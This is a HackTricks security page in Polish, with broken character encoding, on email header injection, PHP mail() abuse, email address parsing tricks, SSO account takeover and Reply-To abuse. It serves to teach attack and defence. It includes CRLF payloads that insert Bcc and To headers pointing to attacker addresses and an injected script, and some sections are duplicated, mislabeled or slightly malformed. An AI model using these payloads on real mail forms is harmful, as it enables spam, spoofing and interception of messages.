# Wstrzykiwanie do wysÅ‚anej wiadomoÅ›ci e-mail

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wstrzykiwanie w wysÅ‚anÄ… wiadomoÅ›Ä‡ e-mail

### Wstrzykiwanie Cc i Bcc po argumencie nadawcy
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
### WstrzykniÄ™cie argumentu

The message will be sent to the recipient and recipient1 accounts.

### WstrzykniÄ™cie argumentu
```
From:sender@domain.com%0ATo:attacker@domain.com
```
WiadomoÅ›Ä‡ zostanie wysÅ‚ana do oryginalnego odbiorcy oraz do konta atakujÄ…cego.

### WstrzykniÄ™cie argumentu Temat (Subject)
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
FaÅ‚szywy temat zostanie dodany do oryginalnego tematu i w niektÃ³rych przypadkach go zastÄ…pi. To zaleÅ¼y od zachowania usÅ‚ugi pocztowej.

### ZmieÅ„ treÅ›Ä‡ wiadomoÅ›ci

Wstrzyknij dwie linie odstÄ™pu, a nastÄ™pnie napisz swojÄ… wiadomoÅ›Ä‡, aby zmieniÄ‡ treÅ›Ä‡ wiadomoÅ›ci.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Wykorzystanie funkcji PHP mail()

The `mail()` function in PHP is commonly used to send emails from a web application. However, if not properly secured, it can be vulnerable to email injection attacks. Email injection occurs when an attacker is able to manipulate the email headers and inject malicious content into the email.

#### Exploiting Email Injection

To exploit email injection, an attacker can craft a specially crafted input that includes additional email headers or commands. These additional headers or commands can be used to perform various malicious actions, such as sending spam emails, stealing sensitive information, or even executing arbitrary code on the server.

#### Example of Email Injection

Consider the following vulnerable code snippet:

```php
<?php
$to = $_POST['email'];
$subject = "Welcome to our website!";
$message = "Thank you for signing up.";
$headers = "From: noreply@example.com";

mail($to, $subject, $message, $headers);
?>
```

In this example, the `$_POST['email']` variable is directly used as the recipient of the email without any validation or sanitization. An attacker can exploit this by injecting additional headers using a newline character (`\r\n`).

For example, an attacker can craft a malicious input like this:

```
email@example.com\r\nBcc: attacker@example.com\r\nContent-Type: text/html\r\n\r\n<script>alert('You have been hacked!');</script>
```

When the email is sent, the additional headers and the injected script will be included in the email. The script will be executed when the email is opened by the recipient, potentially leading to further exploitation.

#### Prevention

To prevent email injection attacks, it is important to properly validate and sanitize user input before using it in email headers. Here are some best practices to follow:

- Validate and sanitize user input: Ensure that user input is properly validated and sanitized to prevent any malicious content from being injected.
- Use a safe email library: Instead of using the `mail()` function directly, consider using a secure email library that handles email headers properly and provides built-in protection against email injection attacks.
- Implement input validation and filtering: Implement input validation and filtering mechanisms to ensure that user input adheres to expected formats and does not contain any malicious content.
- Use prepared statements or parameterized queries: If user input is used in SQL queries, use prepared statements or parameterized queries to prevent SQL injection attacks, which can also be used to perform email injection.

By following these best practices, you can protect your web application from email injection attacks and ensure the security of your users' data.
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### PiÄ…ty parametr ($additional\_parameters)

Ta sekcja bÄ™dzie oparta na **tym, jak naduÅ¼ywaÄ‡ tego parametru zakÅ‚adajÄ…c, Å¼e atakujÄ…cy go kontroluje**.

Ten parametr zostanie dodany do wiersza poleceÅ„, ktÃ³ry PHP bÄ™dzie uÅ¼ywaÅ‚ do wywoÅ‚ania binarnego sendmail. Jednak zostanie on zabezpieczony za pomocÄ… funkcji `escapeshellcmd($additional_parameters)`.

AtakujÄ…cy moÅ¼e **wstrzyknÄ…Ä‡ dodatkowe parametry dla sendmail** w tym przypadku.

#### RÃ³Å¼nice w implementacji /usr/sbin/sendmail

Interfejs **sendmail** jest **dostarczany przez oprogramowanie poczty MTA** (Sendmail, Postfix, Exim itp.) zainstalowane w systemie. ChociaÅ¼ **podstawowe funkcje** (takie jak parametry -t -i -f) pozostajÄ… **takie same** ze wzglÄ™dÃ³w zgodnoÅ›ci, **inne funkcje i parametry** rÃ³Å¼niÄ… siÄ™ znacznie w zaleÅ¼noÅ›ci od zainstalowanego MTA.

Oto kilka przykÅ‚adÃ³w rÃ³Å¼nych stron podrÄ™cznika polecenia sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

W zaleÅ¼noÅ›ci od **pochodzenia binarnego sendmail** odkryto rÃ³Å¼ne opcje naduÅ¼ywania ich i **wyciek plikÃ³w lub nawet wykonywanie dowolnych poleceÅ„**. SprawdÅº jak to zrobiÄ‡ na stronie [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Wstrzykiwanie w nazwÄ™ e-maila

### Pomijane czÄ™Å›ci adresu e-mail

Symbole: **+, -** i **{}** w rzadkich przypadkach mogÄ… byÄ‡ uÅ¼ywane do oznaczania i sÄ… ignorowane przez wiÄ™kszoÅ›Ä‡ serwerÃ³w poczty elektronicznej

* Np. john.doe+intigriti@example.com â†’ john.doe@example.com

**Komentarze w nawiasach ()** na poczÄ…tku lub na koÅ„cu rÃ³wnieÅ¼ sÄ… ignorowane

* Np. john.doe(intigriti)@example.com â†’ john.doe@example.com

### OminiÄ™cie biaÅ‚ej listy

<figure><img src="../.gitbook/assets/image (4) (6).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Cytaty

<figure><img src="../.gitbook/assets/image (6) (4).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Adresy IP

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼ywaÄ‡ adresÃ³w IP jako nazw domenowych, umieszczajÄ…c je w nawiasach kwadratowych:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Inne podatnoÅ›ci

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../.gitbook/assets/image (296).png>)

## SSO osÃ³b trzecich

### XSS

NiektÃ³re usÅ‚ugi, takie jak **github** lub **salesforce**, pozwalajÄ… tworzyÄ‡ **adresy e-mail z zainfekowanymi XSS**. JeÅ›li moÅ¼esz **uÅ¼yÄ‡ tych dostawcÃ³w do logowania siÄ™ na inne usÅ‚ugi** i te usÅ‚ugi **nie oczyszczajÄ…** poprawnie adresu e-mail, moÅ¼esz spowodowaÄ‡ **XSS**.

### PrzejÄ™cie konta

JeÅ›li **usÅ‚uga SSO** pozwala na **utworzenie konta bez weryfikacji podanego adresu e-mail** (tak jak **salesforce**) i nastÄ™pnie moÅ¼esz uÅ¼yÄ‡ tego konta do **zalogowania siÄ™ na innÄ… usÅ‚ugÄ™**, ktÃ³ra **ufa** salesforce, moÅ¼esz uzyskaÄ‡ dostÄ™p do dowolnego konta.\
NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e salesforce wskazuje, czy podany adres e-mail zostaÅ‚ zweryfikowany, ale aplikacja powinna uwzglÄ™dniaÄ‡ tÄ™ informacjÄ™.

## OdpowiedÅº do

MoÅ¼esz wysÅ‚aÄ‡ e-mail uÅ¼ywajÄ…c _**Od: company.com**_ i _**Odpowiedz do: attacker.com**_, a jeÅ›li zostanie wysÅ‚ana **automatyczna odpowiedÅº** z powodu wysÅ‚ania e-maila **z wewnÄ™trznego adresu**, **atakujÄ…cy** moÅ¼e byÄ‡ w stanie **otrzymaÄ‡** tÄ™ **odpowiedÅº**.

## WskaÅºnik odrzutu twardy

NiektÃ³re usÅ‚ugi, takie jak AWS, wprowadzajÄ… prÃ³g znanym jako **wskaÅºnik odrzutu twardego**, zwykle ustawiony na 10%. Jest to kluczowa metryka, zwÅ‚aszcza dla usÅ‚ug dostarczania poczty elektronicznej. Przekroczenie tego wskaÅºnika moÅ¼e spowodowaÄ‡ zawieszenie lub zablokowanie usÅ‚ugi, takiej jak usÅ‚uga poczty elektronicznej AWS.

**Twardy odrzut** odnosi siÄ™ do **e-maila**, ktÃ³ry zostaÅ‚ zwrÃ³cony do nadawcy, poniewaÅ¼ adres odbiorcy jest nieprawidÅ‚owy lub nieistniejÄ…cy. MoÅ¼e to wynikaÄ‡ z rÃ³Å¼nych przyczyn, takich jak wysÅ‚anie e-maila na nieistniejÄ…cy adres, domenÄ™, ktÃ³ra nie istnieje, lub odmowÄ™ serwera odbiorcy przyjÄ™cia **e-maili**.

W kontekÅ›cie AWS, jeÅ›li wysyÅ‚asz 1000 e-maili, a 100 z nich koÅ„czy siÄ™ twardym odrzutem (z powodu nieprawidÅ‚owych adresÃ³w lub domen), oznacza to wskaÅºnik twardego odrzutu wynoszÄ…cy 10%. OsiÄ…gniÄ™cie lub przekroczenie tego wskaÅºnika moÅ¼e spowodowaÄ‡ zablokowanie lub zawieszenie moÅ¼liwoÅ›ci wysyÅ‚ania e-maili przez AWS SES (Simple Email Service).

WaÅ¼ne jest utrzymanie niskiego wskaÅºnika twardego odrzutu, aby zapewniÄ‡ nieprzerwane Å›wiadczenie usÅ‚ug poczty elektronicznej i utrzymanie reputacji nadawcy. Monitorowanie i zarzÄ…dzanie jakoÅ›ciÄ… adresÃ³w e-mail na listach mailingowych moÅ¼e znacznie pomÃ³c w osiÄ…gniÄ™ciu tego celu.

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje, moÅ¼na odwoÅ‚aÄ‡ siÄ™ do oficjalnej dokumentacji AWS dotyczÄ…cej obsÅ‚ugi odrzutÃ³w i skarg [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## OdwoÅ‚ania

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/c
